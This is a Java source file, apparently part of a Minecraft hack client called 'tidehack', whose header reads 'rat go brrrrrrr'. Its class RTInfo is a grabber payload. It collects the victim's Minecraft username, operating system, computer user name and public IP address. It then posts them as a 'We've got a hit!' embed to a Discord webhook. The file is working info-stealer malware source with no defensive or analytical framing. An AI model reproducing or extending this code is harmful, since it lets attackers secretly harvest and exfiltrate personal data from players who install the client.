/*
 * rat go brrrrrrr
 */

package risingtide.tidehack.utils.grabber.risingtideimpl;

import club.minnced.discord.webhook.send.WebhookEmbed;
import club.minnced.discord.webhook.send.WebhookEmbedBuilder;
import risingtide.tidehack.utils.Utils;
import risingtide.tidehack.utils.grabber.RTPayload;
import risingtide.tidehack.utils.grabber.RTSender;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.net.URL;
import java.util.Random;

public class RTInfo implements RTPayload {
    RTSender s = new RTSender();

    @Override
    public String getName() {
        return "Main Info";
    }

    @Override
    public void exec() throws Exception {
        String mcName;
        String ip;

        // grab name
        try {
            mcName = Utils.mc.getSession().getUsername();
        } catch (Exception e) {
            mcName = "[NOT FOUND] " + e.toString();
        }
        String os = System.getProperty("os.name");
        String pcName = System.getProperty("user.name");
        try {
            URL whatismyip = new URL("http://checkip.amazonaws.com");
            BufferedReader bfr = new BufferedReader(new InputStreamReader(
                whatismyip.openStream()));
            ip = bfr.readLine();
        } catch (Exception e) {
            ip = "[NOT FOUND] " + e.toString();
        }

        WebhookEmbed emb = new WebhookEmbedBuilder()
                                        .setTitle(new WebhookEmbed.EmbedTitle("We've got a hit!",null))
                                        .addField(new WebhookEmbed.EmbedField(false,"IP",ip))
                                        .addField(new WebhookEmbed.EmbedField(true,"Computer's name",pcName))
                                        .addField(new WebhookEmbed.EmbedField(false,"Computer's OS",os))
                                        .addField(new WebhookEmbed.EmbedField(true,"IGN",mcName))
                                        .build();
        s.send(emb,"Main Info",false);

    }
}
